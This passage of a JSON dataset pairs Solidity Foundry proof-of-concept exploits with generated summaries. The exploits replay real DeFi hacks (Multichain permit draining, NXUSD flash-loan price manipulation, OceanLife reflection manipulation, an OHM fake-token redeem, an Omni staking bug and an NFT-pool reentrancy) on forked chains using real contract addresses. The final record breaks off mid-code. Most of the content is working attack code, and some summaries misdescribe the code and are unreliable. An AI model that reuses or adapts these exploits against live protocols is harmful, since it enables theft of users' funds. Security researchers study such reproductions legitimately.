CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 16029969); \n    }\n\n    function testExploit() external{\n        NUMBalance = NUM.balanceOf(victimAddress);\n        uint8 v = 0;\n        bytes32 r = 0x3078000000000000000000000000000000000000000000000000000000000000;\n        bytes32 s = 0x3078000000000000000000000000000000000000000000000000000000000000;\n        multichainRouter.anySwapOutUnderlyingWithPermit(\n            victimAddress,\n            address(this),\n            address(this),\n            NUMBalance,\n            block.timestamp + 60,\n            v,\n            r,\n            s,\n            12\n        );\n        NUM.approve(address(Router), type(uint).max);\n        WETH.approve(address(Router), type(uint).max);\n        NUM.transfer(address(Router), NUM.balanceOf(address(this)));\n        address[] memory path = new address[](2);\n        path[0] = address(NUM);\n        path[1] = address(USDC);\n        Router.swapExactTokensForTokens(0, 0, path, address(this));\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDC balance after exploit\",\n            USDC.balanceOf(address(this)),\n            6\n        );\n    }\n\n    function underlying() external returns(address){\n        return address(NUM);\n    }\n\n    function depositVault(uint256 amount, address to) external returns(uint){\n        return NUMBalance;\n    }\n    \n    function burn(address from, uint256 amount) external returns(bool){\n        return true;\n    }\n\n\n}",
        "summary": "This code defines a Solidity contract called `ContractTest` that allows an attacker to exploit a vulnerability in a smart contract on the Ethereum blockchain. The `ContractTest` contract interacts with two other contracts, `MultichainRouter` and `Uni_Router_V3`, to swap tokens and execute the exploit. At a high level, the exploit involves calling the `MultichainRouter` function `anySwapOutUnderlyingWithPermit()` to transfer tokens from a victim's account to the attacker's account, then using `Uni_Router_V3` to swap those tokens for a different token. The specifics of the exploit are not provided in the code, but are described in a Twitter post and Ethereum transaction linked in comments in the code. The `ContractTest` contract also defines several functions and variables that are not used in the exploit itself, suggesting that it may be part of a larger, more complex attack.",
        "id": "fe4a7f0b-d9cf-4caa-aae1-f878b3306532"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://medium.com/nereus-protocol/post-mortem-flash-loan-exploit-in-single-nxusd-market-343fa32f0c6\n// Refer: https://github.com/kedao/exploitDefiLabs/blob/main/src/test/Nxusd_exp.sol\n// Refer: https://dashboard.tenderly.co/tx/ava/0x0ab12913f9232b27b0664cd2d50e482ad6aa896aeb811b53081712f42d54c026\n\nabstract contract IDegenBox {\n    function setMasterContractApproval(\n        address user,\n        address masterContract,\n        bool approved,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public virtual;\n\n    function masterContractApproved(address masterContract, address user)\n        external\n        view\n        virtual\n        returns (bool);\n}\n\ninterface ICauldronV2 {\n    function updateExchangeRate() external returns (bool, uint256);\n\n    function cook(\n        uint8[] calldata actions,\n        uint256[] calldata values,\n        bytes[] calldata datas\n    ) external payable returns (uint256, uint256);\n}\n\ncontract ContractTest is DSTest{\n    ILendingPool aaveLendingPool = ILendingPool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);\n    Uni_Router_V2 Router = Uni_Router_V2(0x60aE616a2155Ee3d9A68541Ba4544862310933d4);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0xf4003F4efBE8691B60249E6afbD307aBE7758adb);\n    ICurvePool CRVPool1 = ICurvePool(0x001E3BA199B4FF4B5B6e97aCD96daFC0E2e4156e);\n    ICurvePool CRVPool2 = ICurvePool(0x3a43A5851A3e3E0e25A3c1089670269786be1577);\n    IERC20 WAVAX = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);\n    IERC20 USDC_e = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);\n    IUSDC USDC = IUSDC(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);\n    IERC20 NXUSD = IERC20(0xF14f4CE569cB3679E99d5059909E23B07bd2F387);\n    IDegenBox DegenBox = IDegenBox(0x0B1F9C2211F77Ec3Fa2719671c5646cf6e59B775);\n    ICauldronV2 CauldronV2 = ICauldronV2(0xC0A7a7F141b6A5Bce3EC1B81823c8AFA456B6930);\n    address metaPool = 0x6BF6fc7EaF84174bb7e1610Efd865f0eBD2AA96D; \n    address masterContract = 0xE767C6C3Bf42f550A5A258A379713322B6c4c060;\n    // flashLoan\n    address[] public _assets = [0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E]; //usdc\n    uint256[] public _amounts = [51000000000000];\n    uint256[] public _modes = [0];\n    // borrow \n    uint8[] public actions = [5, 21, 20, 10]; \n    uint256[] public values = [0, 0, 0, 0];\n    uint borrowAmounts = 998_000 * 1e18;\n    uint share = 0;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"Avalanche\", 19613451); \n    }\n\n    function testExploit() public{\n\n        USDC.approve(address(Router), type(uint).max);\n        WAVAX.approve(address(Router), type(uint).max);\n        // AAVE flashloan\n        aaveLendingPool.flashLoan(\n            address(this),\n            _assets,\n            _amounts,\n            _modes,\n            address(this),\n            new bytes(1),\n            0\n        );\n\n        emit log_named_uint(\n            \"After exploit repaid, profit in USDC of attacker:\",\n            USDC.balanceOf(address(this)) / 1e6\n        );\n\n        \n    }\n\n    function executeOperation(\n        address[] memory assets,\n        uint256[] memory amounts,\n        uint256[] memory premiums,\n        address initiator,\n        bytes memory params\n    ) public returns (bool) {\n        assets;\n        amounts;\n        premiums;\n        params;\n        initiator;\n        // get LP token\n        buyWAVAXAndAddLP();\n        // change LP price\n        address [] memory path = new address[](2);\n        path[0] = address(USDC);\n        path[1] = address(WAVAX);\n        Router.swapExactTokensForTokens(\n            USDC.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n\n        /*\n         * borrow NXUSD\n        */\n        // set contract apporval\n        NXUSD.approve(address(CRVPool1), type(uint).max);\n        Pair.approve(address(DegenBox), type(uint).max);\n        DegenBox.setMasterContractApproval(\n            address(this),\n            masterContract,\n            true,\n            0,\n            0,\n            0\n        );\n        // update rate\n        CauldronV2.updateExchangeRate();\n        // cook function in CauldronV2\n        bytes[] memory datas = new bytes[](4);\n        datas[0] = abi.encode(borrowAmounts, address(this)); // type borrow\n        datas[1] = abi.encode(NXUSD, address(this), borrowAmounts,share); // type withdraw\n        datas[2] = abi.encode(Pair, address(this), 45330977931305070, share); // type deposit\n        datas[3] = abi.encode(-2, address(this), false); // Collateral enter market\n        CauldronV2.cook(actions, values, datas);\n\n        // sell WAVAX`\n        sellWAVAX();\n        // NXUSD -> avCRV -> USDC_e\n        CRVPool1.exchange_underlying(\n            metaPool,\n            0,\n            2,\n            998_000 * 1e18,\n            950_000 * 1e6\n        );\n        // USDC_e -> USDC\n        USDC_e.approve(address(CRVPool2), type(uint).max);\n        CRVPool2.exchange(0, 1, 800_000 * 1e6, 700_000 * 1e6);\n        sellUSDC_e();\n        USDC.approve(address(aaveLendingPool), type(uint).max);\n        return true;\n    }\n\n    function buyWAVAXAndAddLP() public{\n        address [] memory path = new address[](2);\n        path[0] = address(USDC);\n        path[1] = address(WAVAX);\n        Router.swapExactTokensForTokens(\n            280_000 * 1e6,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n        Router.addLiquidity(\n            address(USDC),\n            address(WAVAX),\n            260_000 * 1e6,\n            500_000 * 1e18,\n            250_000 * 1e6,\n            0,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function sellWAVAX() public{\n        address [] memory path = new address[](2);\n        path[0] = address(WAVAX);\n        path[1] = address(USDC);\n        Router.swapExactTokensForTokens(\n            WAVAX.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp + 60\n        );\n    }\n\n    function sellUSDC_e() public{\n        address [] memory path = new address[](2);\n        USDC_e.approve(address(Router), type(uint).max);\n        path[0] = address(USDC_e);\n        path[1] = address(USDC);\n        Router.swapExactTokensForTokens(\n            USDC_e.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp + 60\n        );\n    }\n\n}",
        "summary": "This code defines a Solidity smart contract that exploits a flash loan vulnerability in a Decentralized Finance (DeFi) protocol in order to make profit. The contract imports several other contracts/interfaces in order to interact with various DeFi protocols. In the testExploit() function, the contract performs several actions including taking a flash loan, swapping tokens, borrowing tokens, depositing tokens, and exchanging tokens in order to make a profit. The executeOperation() function is called by the AAVE flash loan function used in testExploit() and contains the main logic for executing the exploit.",
        "id": "ea70d8f0-911c-4835-9163-9a0bb3c1171a"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BeosinAlert/status/1648520494516420608\n// @TX\n// https://bscscan.com/tx/0xa21692ffb561767a74a4cbd1b78ad48151d710efab723b1efa5f1e0147caab0a\n// @Summary\n// The attacker called the `transfer()` and `deliver()` functions to reduce the number of rSupply and tSupply.\n// The value of rate is thus calculated less, increasing the number of reflected tokens in the pair, \n// Finally directly call swap to withdraw $WBNB from the pair.\n\ninterface IOceanLife {\n    function approve(address spender, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function deliver(uint256 tAmount) external;\n    function transfer(address recipient, uint256 amount) external returns (bool);\n}\n\ncontract ContractTest is Test {\n    uint256 constant internal FLASHLOAN_WBNB_AMOUNT = 969 * 1e18;\n\n    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IOceanLife constant OLIFE = IOceanLife(0xb5a0Ce3Acd6eC557d39aFDcbC93B07a1e1a9e3fa);\n    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));\n    IPancakePair constant OLIFE_WBNB_LPPool = IPancakePair(0x915C2DFc34e773DC3415Fe7045bB1540F8BDAE84);\n    \n    address constant dodo = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() external {\n        cheats.createSelectFork(\"bsc\", 27470678);\n    }\n\n    function testExploit() external {\n        DVM(dodo).flashLoan(FLASHLOAN_WBNB_AMOUNT, 0, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker WBNB balance after exploit\", WBNB.balanceOf(address(this)), 18\n        );\n    }\n\n    function loopTransfer(uint256 num) internal {\n        uint i;\n        while(i < num) {\n            uint256 amount = OLIFE.balanceOf(address(this));\n            OLIFE.transfer(address(this), amount);\n            i++;\n        }\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        WBNB.approve(address(pancakeRouter), type(uint256).max);\n\n        address[] memory swapPath = new address[](2);\n        swapPath[0] = address(WBNB);\n        swapPath[1] = address(OLIFE);\n        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            FLASHLOAN_WBNB_AMOUNT,\n            0,\n            swapPath,\n            address(this),\n            block.timestamp\n        );\n        /*  \n            Reflection calculations\n            Rate = rSupply / tSupply (Excluded users are not counted in the supply)\n            balanceOf(pair) = rOwned[pair] / currentRate  \n        */ \n        emit log_named_decimal_uint(\n            \"[INFO] OLIFE amount in pair before the currentRate reduction\", OLIFE.balanceOf(address(OLIFE_WBNB_LPPool)), 9\n        );\n        loopTransfer(19);\n\n        OLIFE.deliver(66859267695870000);\n\n        emit log_named_decimal_uint(\n            \"[INFO] OLIFE amount in pair after the currentRate reduction\", OLIFE.balanceOf(address(OLIFE_WBNB_LPPool)), 9\n        );\n        \n        (uint256 oldOlifeReserve, uint256 bnbReserve, ) = OLIFE_WBNB_LPPool.getReserves();\n        uint256 newolifeReserve = OLIFE.balanceOf(address(OLIFE_WBNB_LPPool));\n        uint256 amountin = newolifeReserve - oldOlifeReserve;\n        uint256 swapAmount = amountin * 9975 * bnbReserve / (oldOlifeReserve * 10000 + amountin * 9975);\n        \n        //swap OLIFE to WBNB\n        OLIFE_WBNB_LPPool.swap(0, swapAmount, address(this), \"\");\n\n        // repay\n        WBNB.transfer(address(dodo), FLASHLOAN_WBNB_AMOUNT);\n    }\n\n}",
        "summary": "This code is a Solidity contract that demonstrates an exploit on the OceanLife network. The contract imports necessary libraries and interfaces and defines constants, including the flash loan amount and addresses of the relevant contracts. \n\nThe contract contains a function `setUp()` that initializes a \"fork\" on the Binance Smart Chain. There is another function `testExploit()` that triggers a flash loan of a certain amount of WBNB. The `DPPFlashLoanCall()` function gets executed when the flash loan is completed. \n\nIn `DPPFlashLoanCall()`, the contract first approves the PancakeSwap router to spend the flash loaned amount of WBNB, then swaps the WBNB for OLIFE tokens to reduce the OLIFE current rate. This is followed by calling the `loopTransfer()` function to transfer OLIFE tokens from multiple addresses to this contract, thereby reducing the number of OLIFE tokens in supply. After that, `deliver()` function is called with a certain amount of tokens, which reduces the current rate even further. Finally, `swap()` function is called on the OLIFE/WBNB liquidity pool to withdraw the WBNB from the pool, making it available for the attacker to use.",
        "id": "296d92ab-7810-4cb4-a5db-b3cc2419b669"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @KeyInfo - Total Lost : 704 ETH (~ 1,080,000 US$)\n// Attacker : 0x443cf223e209e5a2c08114a2501d8f0f9ec7d9be\n// AttackContract : 0xa29e4fe451ccfa5e7def35188919ad7077a4de8f\n// Tx1 attack redeem:  https://etherscan.io/tx/0x3ed75df83d907412af874b7998d911fdf990704da87c2b1a8cf95ca5d21504cf\n\n// @NewsTrack\n// PeckShield : https://twitter.com/peckshield/status/1583416829237526528\n\nCheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\naddress constant OHM = 0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5;\naddress constant BondFixedExpiryTeller = 0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156;\n\ninterface IBondFixedExpiryTeller {\n    function redeem(address token_, uint256 amount_) external;\n}\n\ncontract FakeToken {\n    function underlying() external view returns(address) {\n        return OHM;\n    }\n\n    function expiry() external pure returns (uint48 _expiry) {\n        return 1;\n    }\n\n    function burn(address,uint256) external {\n        // no thing\n    }\n}\n\n\ncontract AttackContract is Test {\n\n    function setUp() public {\n        cheat.createSelectFork(\"mainnet\", 15794363);\n        cheat.label(OHM, \"OHM\");\n        cheat.label(BondFixedExpiryTeller, \"BondFixedExpiryTeller\");\n    }\n\n    function testExploit() public {\n        console.log(\"---------- Start from Block %s ----------\", block.number);\n        emit log_named_decimal_uint(\"Attacker OHM Balance\", IERC20(OHM).balanceOf(address(this)), 9);\n\n        address fakeToken = address(new FakeToken());\n        cheat.label(fakeToken, \"FakeToken\");\n        // console.log(\"Deploy fake token on \", fakeToken);\n        \n        IBondFixedExpiryTeller(BondFixedExpiryTeller).redeem(fakeToken, 30437077948152);\n        console.log(\"Redeeming\");\n        emit log_named_decimal_uint(\"Attacker OHM Balance after hack\", IERC20(OHM).balanceOf(address(this)), 9);\n        \n    }\n}\n",
        "summary": "This is a Solidity contract that defines an attack on a smart contract by exploiting a vulnerability. The vulnerability allows the attacker to redeem a fake token for a large amount of OHM tokens, resulting in a loss of 704 ETH for the victim. The contract imports a Test.sol library and an interface defined in another file. It then defines a FakeToken contract and an AttackContract contract. The AttackContract has a function testExploit() that performs the attack by calling redeem() on the BondFixedExpiryTeller contract with a fakeToken address and a large amount of tokens. The attack is executed by the contract owner when the testExploit() function is called.",
        "id": "fb708dcd-41e7-4db7-931c-3920bff01222"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1615232012834705408\n// @TX\n// invest\n// https://bscscan.com/tx/0x49bed801b9a9432728b1939951acaa8f2e874453d39c7d881a62c2c157aa7613\n// withdraw\n// https://bscscan.com/tx/0xa916674fb8203fac6d78f5f9afc604be468a514aa61ea36c6d6ef26ecfbd0e97\n\ninterface OmniStakingPool {\n    function invest(uint256 end_date, uint256 qty_ort) external;\n    function withdrawAndClaim(uint256 lockId) external;\n    function getUserStaking(address user) external returns (uint256[] memory);\n}\n\ncontract ContractTest is Test {\n\n    address Omni =  0x6f40A3d0c89cFfdC8A1af212A019C220A295E9bB;\n    address ORT = 0x1d64327C74d6519afeF54E58730aD6fc797f05Ba;\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));\n\n    function setUp() public {\n        vm.createSelectFork(\"bsc\", 24850696);\n    }\n\n    function testExploit() public {\n        \n        // 1. get some ort token\n        IWBNB(WBNB).deposit{value: 1e18}();\n        emit log_named_decimal_uint(\"[Before Attacks] Attacker WBNB balance\", WBNB.balanceOf(address(this)), 18);\n        bscSwap(address(WBNB), ORT, 1e18);\n        // 2. invest\n        IERC20(ORT).approve(Omni, type(uint256).max);\n        OmniStakingPool(Omni).invest(0, 1);\n        uint256[] memory stake_ = OmniStakingPool(Omni).getUserStaking(address(this));\n        // 3. withdraw\n        OmniStakingPool(Omni).withdrawAndClaim(stake_[0]);\n\n        // 4. profit\n        bscSwap(ORT, address(WBNB),  IERC20(ORT).balanceOf(address(this)));\n        emit log_named_decimal_uint(\"[After Attacks]  Attacker WBNB balance\", WBNB.balanceOf(address(this)), 18);\n\n    }\n\n    function bscSwap(address tokenFrom, address tokenTo, uint256 amount) internal {\n        IERC20(tokenFrom).approve(address(Router), type(uint).max);\n        address[] memory path = new address[](2);\n        path[0] = tokenFrom;\n        path[1] = tokenTo;\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);\n    }\n\n    receive() external payable {}\n}\n",
        "summary": "This is a Solidity smart contract written in version 0.8.10 that defines a test contract (`ContractTest`). The purpose of this contract is to test an exploit on the `OmniStakingPool` contract. \n\nThe contract starts by importing the `Test.sol` and `interface.sol` files. It then declares an interface `OmniStakingPool` that defines three functions that can be called by the `ContractTest`. \n\nThen, the contract declares and initializes several variables including the `Omni` contract address, the `ORT` token address, the `Uni_Router_V2` address, and two contract instances, `WBNB` and `Router`. \n\nThe `setUp` function is used to create a fork \"bsc\" for testing purposes.\n\nThe `testExploit` function tests the exploit. It first swaps 1 BNB for `ORT` tokens, invests one `ORT` token in the `OmniStakingPool` by calling the `invest` function, gets the staking information by calling the `getUserStaking` function, withdraws the staked `ORT` token and claims the reward by calling the `withdrawAndClaim` function. Finally, it swaps `ORT` tokens for BNB to show that the exploit was successful.\n\nThe `bscSwap` function is an internal helper function that is used to swap tokens on the Binance Smart Chain.\n\nLastly, the `receive` function is a fallback function that accepts incoming BNB transactions.",
        "id": "63b31966-c41d-4312-bdf9-8d15aa480a13"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// Credit: SupremacyCA, the poc rewritten from SupremacyCA.\n\ncontract ContractTest is DSTest {\n\n    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    IERC20 doodle = IERC20(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);\n    IDOODLENFTXVault doodleVault = IDOODLENFTXVault(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);\n    IBalancerVault  balancer   = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);\n    IERC721 doodles = IERC721(0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e);\n    ISushiSwap router = ISushiSwap(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);\n    IOmni pool = IOmni(0xEBe72CDafEbc1abF26517dd64b28762DF77912a9);\n    address private constant NToken = 0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e;\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    uint256 private nonce;\n    address private immutable owner;\n    address private _lib;\n    bytes32 constant private RETURN_VALUE = keccak256(\"ERC3156FlashBorrower.onFlashLoan\");\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Not your biz!\");\n        _;\n    }\n\n    constructor() {\n        cheats.createSelectFork(\"mainnet\", 15114361); // fork mainnet at block 15114361\n        owner = msg.sender;       // Hacker\n\n    }\n\n    function testExploit() public{\n        payable(address(0)).transfer(address(this).balance);\n        emit log_named_uint(\"Before exploiting, ETH balance of attacker:\", address(this).balance);\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(WETH);\n\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 1000 ether;\n\n        balancer.flashLoan(address(this), tokens, amounts, \"\");\n    }\n\n    function receiveFlashLoan(\n        address[] memory,\n        uint256[] memory,\n        uint256[] memory,\n        bytes memory\n    ) external {\n        require(msg.sender == address(balancer), \"You are not a market maker for Flash Loan!\");\n        doodle.approve(address(doodle), type(uint256).max);\n        doodles.setApprovalForAll(address(doodle), true);\n        doodleVault.flashLoan(address(this), address(doodle), 20 ether, \"\");\n    }\n\n    function onFlashLoan(address, address, uint256, uint256, bytes memory) external returns (bytes32) {\n        require(msg.sender == address(doodle), \"You are not a market maker for Flash Loan!\");\n\n        WETH.approve(address(router), type(uint256).max);\n\n        address[] memory _path = new address[](2);\n        _path[0] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH\n        _path[1] = 0x2F131C4DAd4Be81683ABb966b4DE05a549144443; // DOODLE\n\n        router.swapTokensForExactTokens(12e17, 200 ether, _path, address(this), block.timestamp);\n\n        uint256[] memory _specificIds = new uint256[](20);\n        _specificIds[0] = 4777;\n        _specificIds[1] = 4784;\n        _specificIds[2] = 2956;\n        _specificIds[3] = 7806;\n        _specificIds[4] = 4314;\n        _specificIds[5] = 7894;\n        _specificIds[6] = 9582;\n        _specificIds[7] = 1603;\n        _specificIds[8] = 4510;\n        _specificIds[9] = 6932;\n        _specificIds[10] = 1253;\n        _specificIds[11] = 6760;\n        _specificIds[12] = 9403;\n        _specificIds[13] = 1067;\n        _specificIds[14] = 179;\n        _specificIds[15] = 4017;\n        _specificIds[16] = 7165;\n        _specificIds[17] = 720;\n        _specificIds[18] = 5251;\n        _specificIds[19] = 7425;\n        \n        doodleVault.redeem(20, _specificIds);\n\n        require(doodles.balanceOf(address(this)) >= 20, \"redeem error.\");\n\n        Lib lib = new Lib();\n\n        _lib = address(lib);\n\n        lib.approve();\n\n        uint256 length = _specificIds.length;\n\n        for (uint256 i = 0; i < length; i++) {\n            doodles.transferFrom(address(this), address(_lib), _specificIds[i]);\n        }\n        \n        lib.joker();\n\n        uint256[] memory _amount = new uint256[](20);\n \n        for (uint256 j = 0; j < _amount.length; j++) {\n            _amount[j] = 0;\n        }\n\n        require(ILib(_lib).withdrawAll(), \"Withdraw Error.\");\n\n        require(doodleVault.mint(_specificIds, _amount) == 20, \"Error Amounts.\");\n\n        uint256 profit = getters();\n        emit log_named_uint(\"After exploiting, ETH balance of attacker:\", address(this).balance);\n   \n        return RETURN_VALUE;\n\n    }\n\n    function onERC721Received(\n        address,\n        address,\n        uint256,\n        bytes calldata\n    ) external returns (bytes4) {\n        if (msg.sender == NToken) {\n            if (nonce == 21) {\n                nonce++;\n                WETH.approve(address(pool), type(uint256).max);\n                pool.liquidationERC721(address(doodles), address(WETH), address(_lib), 7425, 100 ether, false);\n                return this.onERC721Received.selector;\n            } else if (nonce == 22) {\n\n                uint256[] memory _specificIds = new uint256[](3);\n                _specificIds[0] = 720;\n                _specificIds[1] = 5251;\n                _specificIds[2] = 7425;\n\n                uint256 length = _specificIds.length;\n                for (uint256 i = 0; i < length; i++) {\n                    doodles.safeTransferFrom(address(this), address(_lib), _specificIds[i]);\n                }\n\n                nonce = 1337;\n\n                require(ILib(_lib).attack(), \"Attack Error!\");\n\n                return this.onERC721Received.selector;\n            } else {\n                nonce++;\n                return this.onERC721Received.selector;\n            }\n        } else {\n            return this.onERC721Received.selector;\n        }\n    }\n\n    function getters() internal returns (uint256) {\n        uint256[] memory _specificIds = new uint256[](20);\n        _specificIds[0] = 4777;\n        _specificIds[1] = 4784;\n        _specificIds[2] = 2956;\n        _specificIds[3] = 7806;\n        _specificIds[4] = 4314;\n        _specificIds[5] = 7894;\n        _specificIds[6] = 9582;\n        _specificIds[7] = 1603;\n        _specificIds[8] = 4510;\n        _specificIds[9] = 6932;\n        _specificIds[10] = 1253;\n        _specificIds[11] = 6760;\n        _specificIds[12] = 9403;\n        _specificIds[13] = 1067;\n        _specificIds[14] = 179;\n        _specificIds[15] = 4017;\n        _specificIds[16] = 7165;\n        _specificIds[17] = 720;\n        _specificIds[18] = 5251;\n        _specificIds[19] = 7425;\n\n        uint256[] memory _amounts = new uint256[](20);\n        _amounts[0] = 0;\n        _amounts[1] = 0;\n        _amounts[2] = 0;\n        _amounts[3] = 0;\n        _amounts[4] = 0;\n        _amounts[5] = 0;\n        _amounts[6] = 0;\n        _amounts[7] = 0;\n        _amounts[8] = 0;\n        _amounts[9] = 0;\n        _amounts[10] = 0;\n        _amounts[11] = 0;\n        _amounts[12] = 0;\n        _amounts[13] = 0;\n        _amounts[14] = 0;\n        _amounts[15] = 0;\n        _amounts[16] = 0;\n        _amounts[17] = 0;\n        _amounts[18] = 0;\n        _amounts[19] = 0;\n\n        WETH.transfer(address(balancer), 1000 ether);\n\n        uint256 balance = WETH.balanceOf(address(this));\n\n        WETH.withdraw(balance);\n\n        return address(this).balance;\n    }\n\n    receive() external payable {}\n\n}\n\ncontract Lib {\n\n    address private immutable exp;\n    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    IERC20 doodle = IERC20(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);\n    IERC721 doodles = IERC721(0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e);\n    IOmni pool = IOmni(0xEBe72CDafEbc1abF26517dd64b28762DF77912a9);\n    address private constant NToken = 0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e;\n\n    modifier onlyExp() {\n        require(msg.sender == exp, \"Not your biz!\");\n        _;\n    }\n\n    constructor() {\n        exp = msg.sender;\n    }\n\n    function approve() external onlyExp {\n        doodles.setApprovalForAll(address(pool), true);\n        WETH.approve(address(pool), type(uint256).max);\n    }\n\n    function joker() external onlyExp {\n        DataTypes.ERC721SupplyParams[] memory _params = new DataTypes.ERC721SupplyParams[](3);\n\n        _params[0].tokenId = 720;\n        _params[0].useAsCollateral = true;\n\n        _params[1].tokenId = 5251;\n        _params[1].useAsCollateral = true;\n\n        _params[2].tokenId = 7425;\n        _params[2].useAsCollateral = true;\n\n        pool.supplyERC721(address(doodles), _params, address(this), 0);\n\n        (,, uint256 amount,,,,) = pool.getUserAccountData(address(this));\n\n        pool.borrow(address(WETH), amount, 2, 0, address(this));\n\n        uint256[] memory tokenIds = new uint256[](2);\n\n        tokenIds[0] = 720;\n        tokenIds[1] = 5251;\n\n        require(pool.withdrawERC721(address(doodles), tokenIds, address(exp)) == 2, \"Withdraw Error.\");\n    }\n\n    function attack() external onlyExp returns (bool) {\n        doodles.setApprovalForAll(address(pool), true);\n\n        DataTypes.ERC721SupplyParams[] memory _params = new DataTypes.ERC721SupplyParams[](20);\n\n        _params[0].tokenId = 4777;\n        _params[0].useAsCollateral = true;\n\n        _params[1].tokenId = 4784;\n        _params[1].useAsCollateral = true;\n\n        _params[2].tokenId = 2956;\n        _params[2].useAsCollateral = true;\n\n        _params[3].tokenId = 7806;\n        _params[3].useAsCollateral = true;\n\n        _params[4].tokenId = 4314;\n        _params[4].useAsCollateral = true;\n\n        _params[5].tokenId = 7894;\n        _params[5].useAsCollateral = true;\n\n        _params[6].tokenId = 9582;\n        _params[6].useAsCollateral = true;\n\n        _params[7].tokenId = 1603;\n        _params[7].useAsCollateral = true;       \n\n        _params[8].tokenId = 4510;\n        _params[8].useAsCollateral = true;       \n\n        _params[9].tokenId = 6932;\n        _params[9].useAsCollateral = true;     \n\n        _params[10].tokenId = 1253;\n        _params[10].useAsCollateral = true;\n\n        _params[11].tokenId = 6760;\n        _params[11].useAsCollateral = true;\n\n        _params[12].tokenId = 9403;\n        _params[12].useAsCollateral = true;  \n\n        _params[13].tokenId = 1067;\n        _params[13].useAsCollateral = true;     \n\n        _params[14].tokenId = 179;\n        _params[14].useAsCollateral = true;       \n\n        _params[15].tokenId = 4017;\n        _params[15].useAsCollateral = true;        \n\n        _params[16].tokenId = 7165;\n        _params[16].useAsCollateral = true;      \n\n        _params[17].tokenId = 720;\n        _params[17].useAsCollateral = true;                 \n\n        _params[18].tokenId = 5251;\n        _params[18].useAsCollateral = true;      \n\n        _params[19].tokenId = 7425;\n        _params[19].useAsCollateral = true;            \n\n        pool.supplyERC721(address(doodles), _params, address(this), 0);\n\n        (,, uint256 amount,,,,) = pool.getUserAccountData(address(this));\n\n        pool.borrow(address(WETH), amount, 2, 0, address(this));\n\n        return true;\n    }\n\n    function withdrawAll() external onlyExp returns (bool) {\n        uint256[] memory _specificIds = new uint256[](20);\n        _specificIds[0] = 4777;\n        _specificIds[1] = 4784;\n        _specificIds[2] = 2956;\n        _specificIds[3] = 7806;\n        _specificIds[4] = 4314;\n        _specificIds[5] = 7894;\n        _specificIds[6] = 9582;\n        _specificIds[7] = 1603;\n        